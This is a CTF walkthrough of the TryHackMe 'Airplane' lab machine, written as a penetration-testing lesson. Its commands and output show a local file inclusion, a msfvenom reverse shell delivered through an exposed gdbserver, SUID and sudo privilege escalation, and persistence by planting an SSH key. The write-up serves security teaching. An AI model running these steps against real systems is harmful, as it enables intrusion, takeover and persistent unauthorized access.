---
title: CTF Walkthrough for TryHackMe Machine Airplane
date: 2024-10-16 00:00:00 +0300
categories: [Walkthrough, CTF]
tags: [TryHackMe, Writeup, Restricted Shell, LFI]   
image:
  path: /assets/img/posts/walthrough/tryhackme/2024-10-16-airplane/box-airplane.svg
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Airplane a TryHackMe machine. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
### Machine Description
Name: Airplane<br>
Difficulty: Medium<br>
Operating System: Linux<br>
Machine link: [Airplane](https://tryhackme.com/r/room/airplane)<br>
### Tools used
1) Nmap<br>
2) ffuf<br>

## Reconnaissance

We will start by performing a service scan on the target to enumerate services running on open ports.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Airplane/Scans/Service]
└─$ sudo nmap -n 10.10.158.63 -sV -sC -oN service-scan.nmap    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-11 14:59 BST15:00:56 [0/239]
Stats: 0:01:48 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.30% done; ETC: 15:00 (0:00:00 remaining)
Nmap scan report for 10.10.158.63
Host is up (0.087s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)         
| ssh-hostkey:
|   3072 b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 (RSA)
|   256 ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 (ECDSA)
|_  256 a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 (ED25519)
8000/tcp open  http-alt Werkzeug/3.0.2 Python/3.8.10
|_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html            
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/3.0.2 Python/3.8.10
<SNIP>
|     Content-Length: 269
|     Location: http://airplane.thm:8000/?page=index.html
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://airplane.thm:8000/?page=index.html">http://airplane.thm:8000/?page=index.html</a>. If not, click the link.
<SNIP>                                                            
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.91 seconds   
```

We can see that our target runs an SSH and a Werkzeug web server. In the scan result, the target redirects Nmap to a domain name that we can add to our `/etc/hosts` file.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Airplane]
└─$ echo "10.10.158.63\tairplane.thm" | sudo tee -a /etc/hosts
10.10.158.63    airplane.thm
```

We could continue our enumeration by fuzzing for the presence of Vhosts but we can notice that the target uses a `page ` parameter to import the `index.html` page. We can test if this parameter is vulnerable to local file inclusion vulnerability.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Airplane/Scans/Web]
└─$ curl 'http://airplane.thm:8000/?page=../../../../etc/passwd' 
root:x:0:0:root:/root:/bin/bash
<SNIP>
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
<SNIP>
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
hudson:x:1001:1001::/home/hudson:/bin/bash
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
```

## Exploitation

We can see that the `page` parameter is indeed vulnerable to LFI. We can use this to fuzz for common files on the target.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Airplane/Scan/Web]
└─$ ffuf -ic -c -u 'http://airplane.thm:8000/?page=../../../..FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 14  
<SNIP>
/proc/net/arp           [Status: 200, Size: 156, Words: 79, Lines: 3, Duration: 115ms]
/proc/self/cmdline      [Status: 200, Size: 24, Words: 1, Lines: 1, Duration: 119ms]
/proc/partitions        [Status: 200, Size: 385, Words: 192, Lines: 14, Duration: 132ms]
/proc/self/environ      [Status: 200, Size: 437, Words: 1, Lines: 1, Duration: 133ms]
/proc/cpuinfo           [Status: 200, Size: 2310, Words: 287, Lines: 55, Duration: 143ms]
/proc/net/dev           [Status: 200, Size: 449, Words: 243, Lines: 5, Duration: 147ms]
/proc/net/route         [Status: 200, Size: 512, Words: 290, Lines: 5, Duration: 158ms]
/proc/version           [Status: 200, Size: 154, Words: 17, Lines: 2, Duration: 159ms]
/proc/mounts            [Status: 200, Size: 3099, Words: 206, Lines: 42, Duration: 158ms]
/proc/self/status       [Status: 200, Size: 1333, Words: 89, Lines: 56, Duration: 148ms]
/proc/meminfo           [Status: 200, Size: 1475, Words: 540, Lines: 54, Duration: 147ms]
/proc/interrupts        [Status: 200, Size: 1853, Words: 834, Lines: 35, Duration: 147ms]
/proc/loadavg           [Status: 200, Size: 28, Words: 5, Lines: 2, Duration: 147ms]
/proc/net/tcp           [Status: 200, Size: 84000, Words: 33635, Lines: 561, Duration: 159ms]
<SNIP>
:: Progress: [929/929] :: Job [1/1] :: 116 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
```

The fuzzing returns many files but the most interesting ones are those from the `/proc` directory. We can see the `/proc/self/status` that provides valuable information about the running process i.e. the web server.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Airplane/Scans/Web]
└─$ curl -s 'http://airplane.thm:8000/?page=../../../../proc/self/status'
Name:   python3
Umask:  0022
State:  S (sleeping)
Tgid:   542
Ngid:   0
Pid:    542
PPid:   1
TracerPid:      0
Uid:    1001    1001    1001    1001
Gid:    1001    1001    1001    1001
FDSize: 128
Groups: 1001 
<SNIP>
```

We see that the web server runs as the user Hudson. We know this by comparing the UID in the `/proc/self/status` with that in the `/etc/passwd` file. We can also read the `/proc/net/tcp` file that provides information about currently active TCP connections.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Airplane/Scans/Web]
└─$ curl -s 'http://airplane.thm:8000/?page=../../../../proc/net/tcp'      
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 15531 1 0000000000000000 100 0 0 10 0                     
   1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 19765 1 0000000000000000 100 0 0 10 0                     
   2: 0100007F:0277 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 17930 1 0000000000000000 100 0 0 10 0                     
   3: 00000000:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 21680 1 0000000000000000 100 0 0 10 0                     
   4: 00000000:17A0 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 20211 1 0000000000000000 100 0 0 10 0                     
   5: 3F9E0A0A:1F40 1317080A:9930 01 00000000:00000000 00:00000000 00000000  1001        0 331676 1 0000000000000000 48 4 30 10 10    
```

We can see that the target listens on three ports on the address 0.0.0.0 represented by `00000000`. Remember that our scan returned only two ports i.e. 22 and 8000. This means that the third port is not part of the top 1000 ports. Let's convert these numbers from hexadecimal to decimal.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Airplane/Scans/Web]
└─$ echo $((0x0016))
22

┌──(pentester㉿kali)-[~/…/Challenge/Airplane/Scans/Web]
└─$ echo $((0x01F40))
8000

┌──(pentester㉿kali)-[~/…/Challenge/Airplane/Scans/Web]
└─$ echo $((0x017A0))
6048
```

We see that the target listens on port 6048 which we did not scan earlier. We can perform a quick service scan on this port using Nmap.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Airplane/Scans/Service]
└─$ nmap -n 10.10.158.63 -sV -sC -p6048 -oN  6048-service.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-11 16:11 BST
Nmap scan report for 10.10.158.63
Host is up (0.15s latency).

PORT     STATE SERVICE VERSION
6048/tcp open  x11?

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.52 seconds
```

This port appears to run a service that couldn't be identified by Nmap. We can attempt to read the `cmdline` file of this process in the `proc` folder. We first need to identify which folder contains this process's informations. We can create a wordlist of process IDs that we can use to fuzz the file system using the LFI vulnerability we discoverd earlier.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Airplane/Misc File]
└─$ seq 1 1000 > PIDs.txt 
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Airplane/Misc File]
└─$ ffuf -ic -c -u 'http://airplane.thm:8000/?page=../../../../proc/FUZZ/environ' -w ./PIDs.txt  -fc 500 -fs 14
<SNIP>

538                     [Status: 200, Size: 437, Words: 1, Lines: 1, Duration: 95ms]
542                     [Status: 200, Size: 437, Words: 1, Lines: 1, Duration: 95ms]
592                     [Status: 200, Size: 454, Words: 1, Lines: 1, Duration: 93ms]
:: Progress: [1000/1000] :: Job [1/1] :: 70 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
```

We can see that we access three processes on the target. We can read the `cmdline` file to enumerate the command use to start these processes. This file contain the NULL cahracter `\x00` at its end so we need to replace it with any other character e.g space  to see it contents.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Airplane/Misc File]
└─$ curl -s 'http://airplane.thm:8000/?page=../../../../proc/538/cmdline' | sed 's/\x00/ /g'
/usr/bin/gdbserver 0.0.0.0:6048 airplane                                                                                                                                                                                              
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Airplane/Misc File]
└─$ curl -s 'http://airplane.thm:8000/?page=../../../../proc/542/cmdline' | sed 's/\x00/ /g'
/usr/bin/python3 app.py                                                                                                                                                                                              
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Airplane/Misc File]
└─$ curl -s 'http://airplane.thm:8000/?page=../../../../proc/592/cmdline' | sed 's/\x00/ /g'
/opt/airplane  
```

We can see above that a GDB server is listening on port 6048 we saw earlier. The GDB server is a computer program that makes it possible to remotely debug other programs. This [post](https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver) explains how to exploit this server. We first start by creating a payload using `msfvenom`.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Airplane/Misc File]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.23.19 LPORT=1234 PrependFork=true -f elf -o binary.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Final size of elf file: 226 bytes
Saved as: binary.elf

┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Airplane/Misc File]
└─$ chmod 755 binary.elf  
```

With the palyload set we can start a listener on our attack host.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Airplane/Scans/Web]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

We can now connect to the GDB server running on port 6048 and upload the payload. After uploading the payload we can execute it to gain a reverse shell on the target.
``` bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Airplane/Misc File]
└─$ gdb binary.elf
GNU gdb (Debian 15.1-1) 15.1
Copyright (C) 2024 Free Software Foundation, Inc.
<SNIP>

(gdb) target extended-remote 10.10.158.63:6048
<SNIP>
(gdb) remote put binary.elf /tmp/binary.elf
Successfully sent file "binary.elf".
(gdb) set remote exec-file /tmp/binary.elf
(gdb) run
The program being debugged has been started already.
<SNIP>
(gdb) 
```

When we go back to our listener we will see a reverse connection from the target. We can upgrade this simple shell to a complete TTY shell as shown below.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Airplane/Scans/Web]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.8.23.19] from (UNKNOWN) [10.10.158.63] 51906
python3 -c 'import pty;pty.spawn("/bin/bash")' 
hudson@airplane:/opt$ ^Z
zsh: suspended  nc -lvnp 1234

┌──(pentester㉿kali)-[~/…/Challenge/Airplane/Scans/Web]
└─$ stty raw -echo;fg                        
[1]  + continued  nc -lvnp 1234
                               export TERM=xterm
hudson@airplane:/opt$ 
```

After we have obtain a shell on the target we can enumerate SUID binaries on the target system.
```bash
hudson@airplane:/home/hudson$ find / -perm -4000 2>/dev/null
/usr/bin/find
/usr/bin/sudo
/usr/bin/pkexec
<SNIP>
hudson@airplane:/home/hudson$ ls -l /usr/bin/find
-rwsr-xr-x 1 carlos carlos 320160 Feb 18  2020 /usr/bin/find
```

We can see that the `/usr/bin/find` binary has the SUID bit set for the carlos user. We can run this command with the `-exec` option that allow us to run system command. This gives us a shell as carlos user and we can read the user flag on the system.
```bash
hudson@airplane:/home/hudson$ /usr/bin/find . -exec /bin/sh -p \; -quit
$ whoami
carlos
$ ls /home/carlos
Desktop    Downloads  Pictures  Templates  user.txt
Documents  Music      Public    Videos
```

## Post Exploitation

We can maintain this access by writing a public key we control in Carlos's `/home/carlos/.ssh/authorized_keys` files and connect to the target as the carlos user using SSH. We first create the private/public key pair on our attack host.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Airplane/Misc File]
└─$ ssh-keygen -t ed25519                 
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/pentester/.ssh/id_ed25519): ./id_ed25519
<SNIP>
+----[SHA256]-----+

┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Airplane/Misc File]
└─$ ls
PIDs.txt  binary.elf  id_ed25519  id_ed25519.pub

┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Airplane/Misc File]
└─$ cat id_ed25519.pub                                
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBh4WvTepAN44OAVrcLMr5Zvj1i6KuPXMXw+s31IYxoi pentester@kali
```

Now we copy the contain of the `id_ed25519.pub` file we created to the `/home/carlos/.ssh/authorized_keys` file on the target.
```bash
$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBh4WvTepAN44OAVrcLMr5Zvj1i6KuPXMXw+s31IYxoi pentester@kali'  > /home/carlos/.ssh/authorized_keys
```

Finally we can connect to the target as Carlos using SSH.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Airplane/Misc File]
└─$ ssh carlos@10.10.158.63 -i id_ed25519 
The authenticity of host '10.10.158.63 (10.10.158.63)' can't be established.
ED25519 key fingerprint is SHA256:9q23c/CHFWNnqEDK/eQFZ2BSYcCGfCW3+A9hX0ubHj0.
<SNIP>

carlos@airplane:~$
```

After a successful connection we can enumerate Carlos's sudo privileges.
```bash
carlos@airplane:~$ sudo -l
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

We can see that the user Carlos can run any Ruby file in the `/root` directory and we do not have write access on that directory. The wildcard `*` matches one or more occurrences of any character, including no character including `.` and `/`. We can use this to perform path traversal to execute a ruby script present in a directroy we control as root. We need a ruby script that gives us a shell as the root user.  
```bash
carlos@airplane:~$ pwd
/home/carlos
carlos@airplane:~$ echo "exec('sh')" > test.rb
carlos@airplane:~$
carlos@airplane:~$ sudo /usr/bin/ruby /root/../home/carlos/test.rb 
# whoami
root
# ls /root
root.txt  snap
```

We have perform path travesal and executed the `sh` command as root which gave us a root shell on the target. We can use this access to read the second flag on the target.

## Conclusion

Congratulations! In this walkthrough, you have exploited an LFI vulnerability to enumerate the process using an unindentified GDBserver service which you use to obtain a reverse shell on the target. This machine was designed to show how inconsistent input validation when including files could seriously impact an organisation's security posture. Thanks for following up on this walkthrough.
